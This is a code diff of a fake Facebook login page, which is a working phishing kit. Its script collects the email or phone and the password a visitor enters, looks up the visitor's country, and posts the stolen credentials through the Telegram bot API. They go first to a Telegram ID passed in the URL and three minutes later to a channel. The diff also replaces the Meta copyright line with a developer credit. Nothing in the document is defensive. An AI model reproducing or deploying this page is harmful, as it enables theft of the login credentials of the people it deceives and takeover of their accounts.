@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Facebook</title>
   <style>
     body {
@@ -54,10 +54,6 @@
       background-color: #165ecb;
     }
 
-    small {
-      color: gray;
-    }
-
     .developer {
       margin-top: 15px;
       font-size: 13px;
@@ -73,9 +69,8 @@
     <input type="text" id="identifier" placeholder="Mobile number or email" required>
     <input type="password" id="password" placeholder="Password" required>
     <button type="submit">Log In</button>
-    <small>© Meta Platforms</small>
+    <div class="developer">Developer by @ProH43</div>
   </form>
-  <div class="developer">Developer by.@ProH43</div>
 </div>
 
 <script>
@@ -91,53 +86,52 @@
     try {
       const res = await fetch('https://ipapi.co/json');
       return await res.json();
-    } catch (e) {
+    } catch {
       return { country_name: "Unknown", country_code: "" };
     }
   }
 
-  function getFlag(countryCode) {
-    if (!countryCode) return "";
-    return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt()));
+  function getFlag(code) {
+    if (!code) return "";
+    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt()));
   }
 
-  async function sendTelegramMessage(chatId, text) {
+  async function sendTelegram(chatId, text) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    return fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: chatId, text: text })
     });
   }
 
-  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
     e.preventDefault();
 
-    const identifier = document.getElementById('identifier').value;
-    const password = document.getElementById('password').value;
     const telegramId = getQueryParam('id');
-
     if (!telegramId) {
-      alert('Telegram ID په URL کې نشته!');
+      alert("Telegram ID په URL کې نشته!");
       return;
     }
 
+    const identifier = document.getElementById("identifier").value;
+    const password = document.getElementById("password").value;
+
     const geo = await getGeoInfo();
-    const country = geo.country_name || 'Unknown';
+    const country = geo.country_name || "Unknown";
     const flag = getFlag(geo.country_code);
 
-    const messageToChannel = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}`;
+    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProH43`;
 
-    // Send to channel first
-    await sendTelegramMessage(telegramChannel, messageToChannel);
+    // 1. First: Send to user's Telegram
+    await sendTelegram(telegramId, msg);
 
-    // 3 minutes later send confirmation to user
+    // 2. After 3 minutes, send to channel
     setTimeout(() => {
-      const messageToUser = `✅ ستاسو پانګه ID ثبت شوه.\n📤 وروسته له لوګین څخه، پیغام چینل ته واستول شو.\n🆔 Telegram ID: ${telegramId}`;
-      sendTelegramMessage(telegramId, messageToUser);
-    }, 180000); // 3 minutes
+      sendTelegram(telegramChannel, msg);
+    }, 180000); // 3 mins = 180000 ms
 
-    alert('Please wait...');
+    alert("Please wait...");
   });
 </script>
 
